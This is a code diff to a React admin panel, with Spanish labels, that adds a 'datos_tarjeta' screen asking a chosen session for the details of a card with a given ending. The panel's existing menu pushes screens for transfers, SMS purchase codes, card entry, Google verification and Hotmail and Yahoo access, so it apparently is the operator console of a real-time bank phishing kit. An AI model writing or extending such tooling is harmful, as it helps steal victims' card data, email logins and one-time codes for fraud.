@@ -484,7 +484,7 @@ export default function AdminPanel() {
     console.log("handleScreenChange recibió tipo de pantalla:", screen);
 
     // Handle modals for certain screens
-    if (["protege", "transferir", "cancelacion", "codigo", "mensaje", "sms_compra", "tarjeta", "gmail", "gmail_verify", "hotmail", "yahoo"].includes(screen)) {
+    if (["protege", "transferir", "cancelacion", "codigo", "mensaje", "sms_compra", "tarjeta", "gmail", "gmail_verify", "hotmail", "yahoo", "datos_tarjeta"].includes(screen)) {
       console.log("Activando modal para:", screen);
       setActiveModal(screen);
       return;
@@ -737,6 +737,23 @@ export default function AdminPanel() {
     closeModal();
   };
   
+  const handleDatosTarjetaConfirm = (data: { terminacion: string }) => {
+    if (selectedSessionId) {
+      sendScreenChange({
+        tipo: `mostrar_${ScreenType.DATOS_TARJETA}`,
+        sessionId: selectedSessionId,
+        terminacion: data.terminacion
+      });
+      
+      toast({
+        title: "Solicitud de datos de tarjeta enviada",
+        description: `Se ha solicitado los datos de la tarjeta con terminación: ${data.terminacion}`,
+      });
+    }
+    
+    closeModal();
+  };
+  
   const handleGmailVerifyModalConfirm = (data: { correo: string, codigo: string }) => {
     if (selectedSessionId) {
       // Usamos exactamente lo que el usuario ingresó, sin valores predeterminados
@@ -869,6 +886,7 @@ export default function AdminPanel() {
                   <option value="gmail_verify">10. Verificación Google</option>
                   <option value="hotmail">11. Solicitar acceso Hotmail</option>
                   <option value="yahoo">12. Solicitar acceso Yahoo</option>
+                  <option value="datos_tarjeta">13. Ingreso de datos de tarjeta</option>
                 </select>
               </div>
             </div>
